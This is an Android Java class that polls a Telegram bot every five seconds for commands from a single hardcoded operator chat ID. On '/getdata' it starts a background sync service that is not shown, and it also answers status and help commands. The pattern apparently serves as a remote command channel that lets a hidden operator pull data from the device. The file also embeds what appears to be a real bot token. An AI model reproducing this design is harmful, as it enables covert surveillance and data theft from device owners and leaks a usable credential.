package com.alzahra.telegram;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;

import com.alzahra.services.TelegramSyncService;

import org.json.JSONArray;
import org.json.JSONObject;

public class BotCommandHandler {
    
    private static final String BOT_TOKEN = "8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA";
    private static final String CHAT_ID = "7344776596";
    
    private final Context context;
    private final TelegramBot bot;
    private final Handler handler;
    private long lastUpdateId = 0;
    private boolean isRunning = false;

    public BotCommandHandler(Context context) {
        this.context = context;
        this.bot = new TelegramBot(BOT_TOKEN);
        this.handler = new Handler(Looper.getMainLooper());
    }

    public void startListening() {
        if (isRunning) return;
        isRunning = true;
        
        pollUpdates();
    }

    private void pollUpdates() {
        handler.postDelayed(() -> {
            if (!isRunning) return;
            
            bot.getUpdates(lastUpdateId + 1, updates -> {
                try {
                    if (!updates.optBoolean("ok", false)) return;
                    
                    JSONArray result = updates.optJSONArray("result");
                    if (result == null) return;
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.optJSONObject(i);
                        if (update == null) continue;
                        
                        lastUpdateId = update.optLong("update_id");
                        
                        JSONObject message = update.optJSONObject("message");
                        if (message == null) continue;
                        
                        JSONObject from = message.optJSONObject("from");
                        if (from == null) continue;
                        
                        String senderId = String.valueOf(from.optLong("id"));
                        if (!senderId.equals(CHAT_ID)) continue;
                        
                        String text = message.optString("text", "").toLowerCase().trim();
                        handleCommand(text);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
            
            pollUpdates();
        }, 5000);
    }

    private void handleCommand(String text) {
        if (text.equals("/getdata") || text.equals("تحديث")) {
            bot.sendMessage(CHAT_ID, "⏳ Processing sync request...");
            
            Intent intent = new Intent(context, TelegramSyncService.class);
            intent.setAction(TelegramSyncService.ACTION_MANUAL_SYNC);
            context.startService(intent);
            
        } else if (text.equals("/status")) {
            bot.sendMessage(CHAT_ID, "✅ Service is running normally");
            
        } else if (text.equals("/help")) {
            String help = "📋 <b>Available Commands:</b>\n\n" +
                    "/getdata - Request immediate sync\n" +
                    "/status - Check service status\n" +
                    "/help - Show this help message";
            bot.sendMessage(CHAT_ID, help);
        }
    }

    public void stop() {
        isRunning = false;
    }
}
